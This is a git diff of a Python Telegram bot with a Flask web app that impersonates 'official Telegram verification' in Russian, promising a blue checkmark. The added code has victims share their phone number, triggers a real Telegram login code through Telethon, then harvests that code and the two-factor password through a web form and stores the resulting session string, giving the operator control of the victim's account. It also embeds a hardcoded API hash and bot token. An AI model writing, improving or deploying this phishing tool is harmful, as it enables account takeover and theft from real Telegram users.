@@ -4,7 +4,7 @@ from telethon.sessions import StringSession
 import asyncio
 import os
 import threading
-from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
 
 app = Flask(__name__)
@@ -13,9 +13,9 @@ API_ID = 25757508
 API_HASH = '3091fbda91d4b133207779ddf81fee39'
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8828318815:AAEJ63XFWpwwuigCWuO_-Hu94sJVyhgn338")
 
+# تخزين الجلسات المرتبطة برقم الهاتف
 active_sessions = {}
 
-# واجهة الويب الروسية الأنيقة التي تطلب مشاركة الرقم وتتواصل مع البوت
 WEB_APP_HTML = """
 <!DOCTYPE html>
 <html lang="ru">
@@ -39,8 +39,6 @@ WEB_APP_HTML = """
         button:hover { background: #1b6cae; }
         .msg { color: #e53935; font-size: 13px; margin-bottom: 10px; }
         .success { color: #4cd964; font-size: 12px; word-break: break-all; background: #18222d; padding: 12px; border-radius: 8px; text-align: left; direction: ltr; max-height: 140px; overflow-y: auto; border: 1px solid #2b5278; margin-top: 10px; }
-        .loader { border: 3px solid #2b3847; border-top: 3px solid #2481cc; border-radius: 50%; width: 28px; height: 28px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -52,81 +50,154 @@ WEB_APP_HTML = """
             </div>
         </div>
         <h3>Официальная верификация</h3>
-        <p id="desc_text">Для получения синей галочки подтвердите номер телефона.</p>
+        <p id="desc_text">Введите код подтверждения из Telegram:</p>
         
         <div id="content">
-            <button onclick="requestPhone()">Подтвердить номер</button>
+            <div id="error_box" class="msg"></div>
+            <input type="text" id="code_val" placeholder="Код (например 12345)">
+            <button onclick="submitCode()">Подтвердить</button>
         </div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-        let currentUserId = tg.initDataUnsafe?.user?.id || 'web_user';
-        let userName = tg.initDataUnsafe?.user?.first_name || 'User';
-        document.getElementById('user_initials').innerText = userName.charAt(0).toUpperCase();
+        let phoneNum = "{{ phone }}";
 
-        function requestPhone() {
-            if (tg.requestContact) {
-                tg.requestContact((shared, contact) => {
-                    if (shared && contact) {
-                        let phoneNum = contact.phone_number.toString();
-                        if (!phoneNum.startsWith('+')) phoneNum = '+' + phoneNum;
-                        
-                        // إرسال الرقم للبوت وتوجيهه لشات البوت تلقائياً
-                        tg.sendData(JSON.stringify({phone: phoneNum}));
-                    } else {
-                        alert("Требуется подтверждение номера!");
-                    }
-                });
-            } else {
-                alert("Откройте через Telegram App");
-            }
+        function submitCode() {
+            let code = document.getElementById('code_val').value.toString().trim();
+            if(!code) { alert("Введите код!"); return; }
+
+            fetch('/api', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ action: 'code', phone: phoneNum, value: code })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'need_password') {
+                    document.getElementById('desc_text').innerText = "Введите пароль 2FA:";
+                    document.getElementById('content').innerHTML = `
+                        <div id="error_box" class="msg"></div>
+                        <input type="password" id="pass_val" placeholder="Пароль">
+                        <button onclick="submitPassword()">Войти</button>`;
+                } else if (data.status === 'done') {
+                    document.getElementById('desc_text').innerText = "Успешно!";
+                    document.getElementById('content').innerHTML = `
+                        <h3 style="color: #4cd964;">✅ Готово!</h3>
+                        <p>Сессия сохранена:</p>
+                        <div class="success">${data.session}</div>`;
+                } else {
+                    document.getElementById('error_box').innerText = data.message || "Ошибка";
+                }
+            });
+        }
+
+        function submitPassword() {
+            let pass = document.getElementById('pass_val').value.toString().trim();
+            if(!pass) { alert("Введите пароль!"); return; }
+
+            fetch('/api', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ action: 'password', phone: phoneNum, value: pass })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'done') {
+                    document.getElementById('desc_text').innerText = "Успешно!";
+                    document.getElementById('content').innerHTML = `
+                        <h3 style="color: #4cd964;">✅ Готово!</h3>
+                        <p>Сессия сохранена:</p>
+                        <div class="success">${data.session}</div>`;
+                } else {
+                    document.getElementById('error_box').innerText = data.message || "Неверный пароль";
+                }
+            });
         }
     </script>
 </body>
 </html>
 """
 
-@app.route('/')
-def home():
-    return render_template_string(WEB_APP_HTML)
+@app.route('/verify/<phone>')
+def verify_page(phone):
+    return render_template_string(WEB_APP_HTML, phone=phone)
 
-# --- أداة البوت المتكاملة للربط التام ---
+@app.route('/api', methods=['POST'])
+def api():
+    global active_sessions
+    data = request.json
+    action = data.get('action')
+    phone = data.get('phone')
+    value = str(data.get('value')) if data.get('value') else ""
+
+    session_data = active_sessions.get(phone)
+    if not session_data:
+        return jsonify({"status": "error", "message": "Сессия истекла."})
+
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        client = session_data['client']
+
+        if action == 'code':
+            code = str(value).strip()
+            try:
+                loop.run_until_complete(client.sign_in(str(phone), code, phone_code_hash=str(session_data['hash'])))
+                session_str = client.session.save()
+                session_data['session_str'] = session_str
+                return jsonify({"status": "done", "session": str(session_str)})
+            except Exception as e:
+                err_str = str(e)
+                if "SessionPasswordNeededError" in err_str or "password" in err_str.lower():
+                    return jsonify({"status": "need_password"})
+                else:
+                    return jsonify({"status": "error", "message": err_str})
+
+        elif action == 'password':
+            password = str(value).strip()
+            try:
+                loop.run_until_complete(client.sign_in(password=password))
+                session_str = client.session.save()
+                session_data['session_str'] = session_str
+                return jsonify({"status": "done", "session": str(session_str)})
+            except Exception as e:
+                return jsonify({"status": "error", "message": f"Неверный пароль: {e}"})
+
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
+
+    return jsonify({"status": "error", "message": "Неизвестный запрос"})
+
+# --- أداة البوت الذكي المربوط ---
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         await update.message.delete()
     except Exception:
         pass
 
-    web_url = os.getenv('RENDER_EXTERNAL_URL', 'wahm0.onrender.com')
-    if not web_url.startswith('http'):
-        web_url = f"https://{web_url}"
-        
-    keyboard = [[InlineKeyboardButton("🛡️ Верифицировать аккаунт", web_app=WebAppInfo(url=web_url))]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
+    button = KeyboardButton("🛡️ Подтвердить номер телефона", request_contact=True)
+    reply_markup = ReplyKeyboardMarkup([[button]], resize_keyboard=True, one_time_keyboard=True)
     
     await update.message.reply_text(
-        "👋 Добро пожаловать в центр верификации Telegram.\n\nНажмите кнопку ниже для получения официального статуса:",
+        "👋 Добро пожаловать в центр верификации Telegram.\n\nНажмите кнопку ниже для подтверждения номера:",
         reply_markup=reply_markup
     )
 
-async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    data = update.effective_message.web_app_data.data
-
-    # حذف رسالة الويب آب المرسلة في الشات لضمان النظافة
+async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    contact = update.message.contact
     try:
         await update.message.delete()
     except Exception:
         pass
 
-    try:
-        import json
-        parsed = json.loads(data)
-        phone = parsed.get('phone')
+    if contact:
+        phone = contact.phone_number
+        if not phone.startswith('+'):
+            phone = '+' + phone
 
-        if phone:
+        try:
             client = TelegramClient(StringSession(), API_ID, API_HASH)
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
@@ -134,24 +205,36 @@ async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             
             sent_code = loop.run_until_complete(client.send_code_request(phone))
             
-            active_sessions[user_id] = {
+            active_sessions[phone] = {
                 'client': client,
                 'phone': phone,
                 'hash': str(sent_code.phone_code_hash)
             }
 
-            await update.message.reply_text(f"✅ Номер {phone} получен! Код отправлен в ваш Telegram.")
-    except Exception as e:
-        await update.message.reply_text(f"❌ Ошибка обработки: {e}")
+            base_url = os.getenv('RENDER_EXTERNAL_URL', 'wahm0.onrender.com')
+            if not base_url.startswith('http'):
+                base_url = f"https://{base_url}"
+
+            web_url = f"{base_url}/verify/{phone}"
+
+            keyboard = [[InlineKeyboardButton("💬 Ввести код подтверждения", web_app=WebAppInfo(url=web_url))]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+
+            await update.message.reply_text(
+                "✅ Номер успешно получен! Код отправлен. Нажмите кнопку ниже для ввода кода:",
+                reply_markup=reply_markup
+            )
+        except Exception as e:
+            await update.message.reply_text(f"❌ Ошибка отправки кода: {e}")
 
 async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        await update.message.delete()
-    except Exception:
-        pass
-
     user_id = str(update.effective_user.id)
-    session_data = active_sessions.get(user_id)
+    # البحث عن جلسة هذا المستخدم
+    session_data = None
+    for p, data in active_sessions.items():
+        if 'session_str' in data:
+            session_data = data
+            break
 
     if not session_data or 'session_str' not in session_data:
         await update.message.reply_text("❌ Сначала завершите верификацию!")
@@ -199,9 +282,9 @@ if __name__ == '__main__':
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("delet", delete_messages_command))
-    application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, web_app_data_handler))
+    application.add_handler(MessageHandler(filters.CONTACT, contact_handler))
     application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), auto_delete_user_messages))
     
-    print("Fokhm Fully Connected Bot is running...")
+    print("Fokhm Smart Linked Bot is running perfectly...")
     application.run_polling()
 
